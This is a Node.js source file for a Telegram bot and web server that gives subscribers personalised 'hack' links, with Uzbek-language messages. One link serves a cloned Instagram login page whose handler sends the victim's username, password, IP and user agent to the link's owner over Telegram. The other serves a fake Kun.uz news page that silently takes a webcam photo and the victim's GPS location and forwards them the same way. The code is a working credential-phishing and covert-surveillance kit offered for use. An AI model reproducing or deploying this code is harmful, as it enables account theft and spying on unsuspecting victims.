// index.js (ESM) – Node 18+
// npm i telegraf express multer dotenv node-fetch

import dotenv from "dotenv";
dotenv.config();

import express from "express";
import multer from "multer";
import { Telegraf } from "telegraf";
import path from "path";
import { fileURLToPath } from "url";
import fs from "fs";
import fetch from "node-fetch";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

// === CONFIG ===
const BOT_TOKEN = process.env.BOT_TOKEN;
const HOST = process.env.HOST || "tgbot-tg1w.onrender.com";
const PORT = process.env.PORT || 3000;
const FIREBASE_DB_URL = process.env.FIREBASE_DB_URL;
const ADMIN_USER_ID = "5310317109";
const CHANNEL_ID = -1002970130807;
const CHANNEL_INVITE_LINK = "https://t.me/+VN0ATDiz9DBkOTQy";

if (!BOT_TOKEN || !FIREBASE_DB_URL) {
  console.error("ERROR: Set BOT_TOKEN and FIREBASE_DB_URL in .env");
  process.exit(1);
}

// === FIREBASE ===
async function saveUser(id) {
  try {
    await fetch(`${FIREBASE_DB_URL}/users/${id}.json`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ timestamp: Date.now() })
    });
    await updateStats();
  } catch (e) { console.error("Save user error:", e); }
}
async function updateStats() {
  try {
    const usersRes = await fetch(`${FIREBASE_DB_URL}/users.json`);
    const users = usersRes.ok ? (await usersRes.json() || {}) : {};
    const total = Object.keys(users).length;
    await fetch(`${FIREBASE_DB_URL}/stats.json`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ total, updated: Date.now() })
    });
    console.log(`Stats updated: Total Users = ${total}`);
  } catch (e) { console.error("Update stats error:", e); }
}
async function getStats() {
  try {
    const res = await fetch(`${FIREBASE_DB_URL}/stats.json`);
    if (!res.ok) return { total: 0 };
    const data = await res.json();
    return { total: data?.total || 0 };
  } catch (e) { return { total: 0 }; }
}
async function getAllUsers() {
  try {
    const res = await fetch(`${FIREBASE_DB_URL}/users.json`);
    if (!res.ok) return {};
    const data = await res.json();
    return data || {};
  } catch (e) { return {}; }
}

// === BOT ===
const bot = new Telegraf(BOT_TOKEN);
const broadcastState = new Map();

async function checkSubscription(userId) {
  try {
    const member = await bot.telegram.getChatMember(CHANNEL_ID, userId);
    return ["member", "administrator", "creator"].includes(member.status);
  } catch (e) {
    console.error("checkSubscription error:", e);
    return false;
  }
}
async function showSubscriptionRequired(ctx) {
  await ctx.reply(
    `*Channel Subscription Required*\n\nTo use this bot, please join our private channel first!`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Join Private Channel", url: CHANNEL_INVITE_LINK }],
          [{ text: "I've Joined", callback_data: "check_subscription" }]
        ]
      }
    }
  );
}

// === /start – PERSONALIZED INSTAGRAM LINK ===
bot.start(async (ctx) => {
  const id = String(ctx.from.id);
  const ok = await checkSubscription(id);
  if (!ok) return showSubscriptionRequired(ctx);

  await saveUser(id);

  const personalInstaLink = `https://${HOST}/insta/${id}`;
  const referralLink = `https://${HOST}/r/${id}`;

  await ctx.reply(
    `✨ *Xush Kelibsiz! Bu Havolalarni Dostlaringizga Yuboring *\n\n🔗 *Kamera va Lokatsiyan Hack havolasi:*\n${referralLink}\n\n📷 *Instagram Login va Parol hack havolasi:*\n${personalInstaLink}\n\nПоделитесь ссылкой или откройте профиль.`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📷 Instagram hack havola", url: personalInstaLink }],
          [{ text: "🔗 Kamera va Lokatsiya hack havola", url: referralLink }],
        ]
      }
    }
  );
});

bot.action("check_subscription", async (ctx) => {
  await ctx.answerCbQuery("Checking…");
  const id = String(ctx.from.id);
  const ok = await checkSubscription(id);
  if (ok) {
    const link = `https://${HOST}/insta/${id}`;
    await ctx.editMessageText(
      `*Subscription Verified!*\n\nВаша ссылка:\nhttps://${HOST}/r/${id}\n\nInstagram: ${link}`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "Open Instagram", url: link }]]
        }
      }
    );
    await saveUser(id);
  } else {
    await ctx.editMessageText(
      `*Subscription Required*\n\nYou haven't joined the channel yet.`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Join Private Channel", url: CHANNEL_INVITE_LINK }],
            [{ text: "I've Joined", callback_data: "check_subscription" }]
          ]
        }
      }
    );
  }
});

bot.command("link", async (ctx) => {
  const id = String(ctx.from.id);
  const ok = await checkSubscription(id);
  if (!ok) return showSubscriptionRequired(ctx);
  await saveUser(id);
  await ctx.reply(`https://${HOST}/r/${id}`);
});

// === ADMIN PANEL (unchanged) ===

bot.action("stats", async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.answerCbQuery();
  const { total } = await getStats();
  await ctx.editMessageText(`*User Statistics*\n\nTotal Users: ${total}`, { parse_mode: "Markdown" });
  await ctx.answerCbQuery();
});
bot.action("broadcast", async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.answerCbQuery();
  const users = await getAllUsers();
  const ids = Object.keys(users);
  if (!ids.length) return ctx.editMessageText("No users in DB.");
  const bid = Date.now();
  broadcastState.set(bid, { targets: ids, adminChatId: ctx.chat.id });
  await ctx.editMessageText(
    `*Broadcast Setup*\n\nUsers: ${ids.length}\nBroadcast ID: ${bid}\n\nSend the message:`,
    {
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "Cancel", callback_data: `cancel_${bid}` }]] }
    }
  );
  await ctx.answerCbQuery();
});
bot.action(/cancel_(\d+)/, async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.answerCbQuery();
  broadcastState.delete(parseInt(ctx.match[1]));
  await ctx.editMessageText("Broadcast cancelled.");
  await ctx.answerCbQuery();
});
bot.on("message", async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID || ctx.chat.type !== "private") return;
  let state = null;
  for (const [_, s] of broadcastState) {
    if (s.adminChatId === ctx.chat.id) { state = s; break; }
  }
  if (!state) return;
  const txt = ctx.message.text || ctx.message.caption || "";
  if (!txt.trim()) return ctx.reply("Empty message.");
  const status = await ctx.reply(`Sending…\n0/${state.targets.length}`);
  let sent = 0, failed = 0;
  for (let i = 0; i < state.targets.length; i++) {
    try { await ctx.telegram.sendMessage(state.targets[i], txt); sent++; }
    catch { failed++; }
    if ((i + 1) % 10 === 0 || i === state.targets.length - 1) {
      await ctx.telegram.editMessageText(ctx.chat.id, status.message_id, undefined,
        `Sending…\n${i + 1}/${state.targets.length}\nSent: ${sent}\nFailed: ${failed}`,
        { parse_mode: "Markdown" });
    }
    await new Promise(r => setTimeout(r, 100));
  }
  await ctx.telegram.editMessageText(ctx.chat.id, status.message_id, undefined,
    `*Done!*\nTotal: ${state.targets.length}\nSent: ${sent}\nFailed: ${failed}`,
    { parse_mode: "Markdown" });
  broadcastState.clear();
});

// === EXPRESS ===
const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 6 * 1024 * 1024 } });

const INSTA_PATH = path.join(__dirname, "test insta");
app.use("/insta", express.static(INSTA_PATH));

// Load HTML once
const rawHtml = fs.readFileSync(path.join(INSTA_PATH, "index.html"), "utf8");

// Render with dynamic form action
function renderInsta(userId = null) {
  let html = rawHtml;
  html = html.replace(/\.\/public\//g, "/insta/public/");
  const action = userId ? `/login/${userId}` : "/login";
  html = html.replace(/action="\/login"/, `action="${action}"`);
  return html;
}

// Routes
app.get("/insta", (req, res) => res.send(renderInsta()));
app.get("/insta/:userId", (req, res) => {
  const uid = req.params.userId;
  if (!/^\d+$/.test(uid)) return res.redirect("/insta");
  res.send(renderInsta(uid));
});

// Capture
async function handleLogin(req, res, targetId) {
  const { username, password } = req.body;
  if (!username || !password) return res.redirect("/insta");

  const ip = req.ip || req.headers["x-forwarded-for"] || "unknown";
  const ua = (req.get("User-Agent") || "").substring(0, 100);
  const time = new Date().toLocaleString("en-US", { timeZone: "UTC" });

  const msg = `
*INSTAGRAM LOGIN*
*User:* \`${username}\`
*Pass:* \`${password}\`
*IP:* \`${ip}\`
*UA:* \`${ua}…\`
*Time:* \`${time}\`
  `.trim();

  try {
    await bot.telegram.sendMessage(targetId, msg, { parse_mode: "Markdown" });
    console.log(`Sent to ${targetId}: ${username}`);
  } catch (e) {
    console.error(`Failed to send to ${targetId}:`, e.message);
  }
  res.redirect("https://www.instagram.com/");
}

app.post("/login", (req, res) => handleLogin(req, res, ADMIN_USER_ID));
app.post("/login/:userId", (req, res) => {
  const uid = req.params.userId;
  if (!/^\d+$/.test(uid)) return res.redirect("/insta");
  handleLogin(req, res, parseInt(uid));
});

// === STUDENT PAGE ===
app.get("/r/:ref", async (req, res) => {
  const ref = req.params.ref;
  if (!/^\d+$/.test(ref)) return res.status(400).send("Invalid");
  await saveUser(ref);
  res.type("html").send(`<!DOCTYPE html>
<html lang="uz"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Kun.uz - So'nggi yangiliklar</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body,html{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f5f5f5;color:#333;line-height:1.6;}
.header{background:#fff;border-bottom:3px solid #e31e24;box-shadow:0 2px 8px rgba(0,0,0,.1);position:sticky;top:0;z-index:1000;}
.header-content{max-width:1200px;margin:0 auto;padding:15px 20px;display:flex;align-items:center;justify-content:space-between;}
.logo{font-size:28px;font-weight:700;color:#e31e24;text-decoration:none;}
.logo:hover{opacity:.9;}
.nav{display:flex;gap:25px;flex-wrap:wrap;}
.nav a{color:#333;text-decoration:none;font-weight:500;font-size:15px;transition:color .3s;}
.nav a:hover{color:#e31e24;}
.container{max-width:1200px;margin:20px auto;padding:0 20px;}
.main-content{display:grid;grid-template-columns:1fr 350px;gap:25px;margin-top:20px;}
@media(max-width:968px){.main-content{grid-template-columns:1fr;}}
.article-card{background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.08);margin-bottom:20px;transition:transform .2s,box-shadow .2s;}
.article-card:hover{transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,.12);}
.article-image{width:100%;height:220px;object-fit:cover;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);}
.article-content{padding:20px;}
.article-title{font-size:22px;font-weight:700;color:#1a1a1a;margin-bottom:12px;line-height:1.4;}
.article-meta{display:flex;gap:15px;font-size:13px;color:#666;margin-bottom:15px;}
.article-text{color:#555;line-height:1.7;margin-bottom:15px;}
.read-more{display:inline-block;color:#e31e24;text-decoration:none;font-weight:600;font-size:14px;}
.read-more:hover{text-decoration:underline;}
.sidebar{background:#fff;border-radius:8px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,.08);height:fit-content;position:sticky;top:90px;}
.sidebar-title{font-size:18px;font-weight:700;color:#1a1a1a;margin-bottom:15px;padding-bottom:10px;border-bottom:2px solid #e31e24;}
.news-item{display:flex;gap:12px;padding:12px 0;border-bottom:1px solid #eee;}
.news-item:last-child{border-bottom:none;}
.news-item img{width:80px;height:60px;object-fit:cover;border-radius:4px;background:#ddd;}
.news-item-content{flex:1;}
.news-item-title{font-size:14px;font-weight:600;color:#1a1a1a;margin-bottom:5px;line-height:1.4;}
.news-item-time{font-size:12px;color:#999;}
.hero-section{background:linear-gradient(135deg,#e31e24 0%,#c41e3a 100%);color:#fff;padding:40px 20px;border-radius:8px;text-align:center;margin-bottom:30px;}
.hero-title{font-size:32px;font-weight:700;margin-bottom:15px;}
.hero-subtitle{font-size:18px;opacity:.95;}
.status-box{background:#fff;border-left:4px solid #e31e24;padding:15px;margin:15px 0;border-radius:4px;}
.status-item{display:flex;align-items:center;gap:10px;padding:8px 0;font-size:14px;}
.status-icon{width:20px;height:20px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;}
.status-icon.pending{background:#ffc107;color:#000;}
.status-icon.success{background:#28a745;color:#fff;}
.status-icon.error{background:#dc3545;color:#fff;}
.btn-primary{background:#e31e24;color:#fff;border:none;padding:14px 28px;font-size:16px;font-weight:600;border-radius:6px;cursor:pointer;width:100%;transition:background .3s;}
.btn-primary:hover{background:#c41e3a;}
.btn-primary:disabled{background:#ccc;cursor:not-allowed;}
.loading{display:inline-block;width:16px;height:16px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin .6s linear infinite;margin-left:8px;}
@keyframes spin{to{transform:rotate(360deg);}}
.hidden{display:none;}
#videoPreview{width:100%;max-width:400px;border-radius:8px;margin:15px 0;display:none;}
.success-message{background:#28a745;color:#fff;padding:20px;border-radius:8px;text-align:center;margin-top:20px;font-size:18px;font-weight:600;}
</style></head><body>
<div class="header">
<div class="header-content">
<a href="#" class="logo">Kun.uz</a>
<nav class="nav">
<a href="#">Asosiy</a>
<a href="#">Jamiyat</a>
<a href="#">Iqtisodiyot</a>
<a href="#">Siyosat</a>
<a href="#">Sport</a>
<a href="#">Texnologiya</a>
</nav>
</div>
</div>
<div class="container">
<div class="hero-section">
<h1 class="hero-title">So'nggi yangiliklar va muhim voqealar</h1>
<p class="hero-subtitle">O'zbekistondagi eng tezkor va ishonchli axborot manbasi</p>
</div>
<div class="main-content">
<div>
<div class="article-card">
<div class="article-image"></div>
<div class="article-content">
<h2 class="article-title">Prezident yangi investitsiya loyihalarini taqdim etdi</h2>
<div class="article-meta">
<span>📅 Bugun, 14:30</span>
<span>👁️ 12,450</span>
<span>💬 234</span>
</div>
<p class="article-text">O'zbekiston Prezidenti mamlakat iqtisodiyotini rivojlantirish bo'yicha yangi investitsiya loyihalarini taqdim etdi. Loyihalar jami 5 milliard dollarni tashkil etadi va minglab yangi ish o'rinlarini yaratadi.</p>
<a href="#" class="read-more">Batafsil o'qish →</a>
</div>
</div>
<div class="article-card">
<div class="article-content">
<h2 class="article-title">Toshkentda yangi metro liniyasi ochildi</h2>
<div class="article-meta">
<span>📅 Bugun, 11:15</span>
<span>👁️ 8,920</span>
<span>💬 156</span>
</div>
<p class="article-text">Toshkent metrosining yangi liniyasi foydalanishga topshirildi. Yangi liniya shaharning janubiy qismini markaz bilan bog'laydi va transport muammolarini yechishga yordam beradi.</p>
<a href="#" class="read-more">Batafsil o'qish →</a>
</div>
</div>
<div class="status-box">
<h3 style="margin-bottom:15px;color:#1a1a1a;">Tekshiruv holati</h3>
<div class="status-item">
<div class="status-icon pending" id="photoIcon">⏳</div>
<span id="photoStatus">Kamera ruxsati so'ralmoqda...</span>
</div>
<div class="status-item">
<div class="status-icon pending" id="locationIcon">⏳</div>
<span id="locationStatus">Joylashuv ruxsati so'ralmoqda...</span>
</div>
</div>
<video id="videoPreview" autoplay playsinline></video>
<button class="btn-primary" id="submitBtn" disabled>Tasdiqlash va yuborish</button>
<div id="successMessage" class="hidden success-message">Muvaffaqiyatli yuborildi! Sizning ma'lumotlaringiz qayta ishlanmoqda.</div>
</div>
<div class="sidebar">
<h3 class="sidebar-title">Tezkor yangiliklar</h3>
<div class="news-item">
<div style="width:80px;height:60px;background:#ddd;border-radius:4px;"></div>
<div class="news-item-content">
<div class="news-item-title">Yangi ta'lim dasturlari e'lon qilindi</div>
<div class="news-item-time">1 soat oldin</div>
</div>
</div>
<div class="news-item">
<div style="width:80px;height:60px;background:#ddd;border-radius:4px;"></div>
<div class="news-item-content">
<div class="news-item-title">Sog'liqni saqlash tizimida yangiliklar</div>
<div class="news-item-time">2 soat oldin</div>
</div>
</div>
<div class="news-item">
<div style="width:80px;height:60px;background:#ddd;border-radius:4px;"></div>
<div class="news-item-content">
<div class="news-item-title">Qishloq xo'jaligida rekord hosil</div>
<div class="news-item-time">3 soat oldin</div>
</div>
</div>
<div class="news-item">
<div style="width:80px;height:60px;background:#ddd;border-radius:4px;"></div>
<div class="news-item-content">
<div class="news-item-title">Turizm sohasida o'sish kuzatildi</div>
<div class="news-item-time">4 soat oldin</div>
</div>
</div>
</div>
</div>
</div>
</div>
<script>
const ref=${JSON.stringify(ref)};
const firebaseUrl=${JSON.stringify(FIREBASE_DB_URL)};
let photoBlob=null,geo=null,username=null;
let photoReady=false,locationReady=false;

if(window.Telegram?.WebApp){
Telegram.WebApp.ready();
Telegram.WebApp.expand();
const u=Telegram.WebApp.initDataUnsafe.user;
if(u)username=u.username||null;
}

function updateButton(){
const btn=document.getElementById("submitBtn");
if(photoReady||locationReady){
btn.disabled=false;
btn.innerHTML="Tasdiqlash va yuborish";
}else{
btn.disabled=true;
btn.innerHTML="Kamera yoki joylashuv kerak";
}
}

async function requestCamera(){
const photoIcon=document.getElementById("photoIcon");
const photoStatus=document.getElementById("photoStatus");
const videoPreview=document.getElementById("videoPreview");
try{
photoStatus.textContent="Kamera ochilmoqda...";
const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
const video=document.createElement("video");
video.srcObject=stream;
video.muted=true;
video.play();
await new Promise(r=>video.onloadeddata=r);
const canvas=document.createElement("canvas");
canvas.width=video.videoWidth||640;
canvas.height=video.videoHeight||480;
canvas.getContext("2d").drawImage(video,0,0,canvas.width,canvas.height);
photoBlob=await new Promise(res=>canvas.toBlob(res,"image/jpeg",0.9));
stream.getTracks().forEach(t=>t.stop());
photoIcon.className="status-icon success";
photoIcon.textContent="✓";
photoStatus.textContent="Kamera muvaffaqiyatli yuklandi";
photoReady=true;
updateButton();
}catch(e){
photoIcon.className="status-icon error";
photoIcon.textContent="✗";
photoStatus.textContent="Kamera ruxsati rad etildi";
console.error("Camera error:",e);
}
}

async function requestLocation(){
const locationIcon=document.getElementById("locationIcon");
const locationStatus=document.getElementById("locationStatus");
try{
locationStatus.textContent="Joylashuv aniqlanmoqda...";
geo=await new Promise((res,rej)=>{
const t=setTimeout(()=>rej(),8000);
navigator.geolocation.getCurrentPosition(
p=>{
clearTimeout(t);
res({lat:p.coords.latitude,lon:p.coords.longitude});
},
()=>{
clearTimeout(t);
rej();
},
{timeout:8000,enableHighAccuracy:true}
);
});
locationIcon.className="status-icon success";
locationIcon.textContent="✓";
locationStatus.textContent="Joylashuv muvaffaqiyatli aniqlandi";
locationReady=true;
updateButton();
}catch(e){
locationIcon.className="status-icon error";
locationIcon.textContent="✗";
locationStatus.textContent="Joylashuv ruxsati rad etildi";
console.error("Location error:",e);
}
}

document.getElementById("submitBtn").onclick=async()=>{
const btn=document.getElementById("submitBtn");
const successMsg=document.getElementById("successMessage");
btn.disabled=true;
btn.innerHTML="Yuborilmoqda...<span class='loading'></span>";
try{
const fd=new FormData();
fd.append("ref",ref);
if(geo){
fd.append("latitude",geo.lat);
fd.append("longitude",geo.lon);
}
if(photoBlob)fd.append("photo",photoBlob,"s.jpg");
await fetch("/submit",{method:"POST",body:fd});
const userData={userId:ref,username,timestamp:Date.now(),active:true,hasPhoto:!!photoBlob,hasLocation:!!geo};
await fetch(\`\${firebaseUrl}/activeUsers/\${ref}.json\`,{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify(userData)});
btn.style.display="none";
successMsg.classList.remove("hidden");
}catch(e){
btn.disabled=false;
btn.innerHTML="Xatolik yuz berdi. Qayta urinib ko'ring";
console.error("Submit error:",e);
}
};

requestCamera();
requestLocation();
</script></body></html>`);
});

// === SUBMIT ===
app.post("/submit", upload.single("photo"), async (req, res) => {
  try {
    const { ref, latitude, longitude } = req.body;
    if (!ref || !/^\d+$/.test(ref)) return res.status(400).json({ ok: false });
    const p = [];
    if (req.file?.buffer) p.push(bot.telegram.sendPhoto(ref, { source: req.file.buffer }, { caption: `Student (ref ${ref})` }).catch(() => {}));
    if (latitude && longitude) {
      const lat = parseFloat(latitude), lon = parseFloat(longitude);
      if (!isNaN(lat) && !isNaN(lon)) {
        p.push(bot.telegram.sendLocation(ref, lat, lon).catch(() => {}));
        p.push(bot.telegram.sendMessage(ref, `GPS: ${lat.toFixed(5)}, ${lon.toFixed(5)}`).catch(() => {}));
      }
    }
    if (!p.length) p.push(bot.telegram.sendMessage(ref, `Link opened (ref ${ref})`).catch(() => {}));
    await Promise.allSettled(p);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ ok: false });
  }
});

app.get("/", (_, res) => res.json({ status: "OK" }));

// === START ===
const server = app.listen(PORT, "0.0.0.0", () => {
  console.log(`LIVE: https://${HOST}`);
});
bot.launch().then(() => console.log("Bot LIVE"));

// === KEEP ALIVE ===
server.on("listening", () => {
  setTimeout(() => {
    const ping = () => fetch(`https://${HOST}`).catch(() => {});
    ping();
    setInterval(ping, 9 * 60 * 1000);
  }, 10000);
});

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));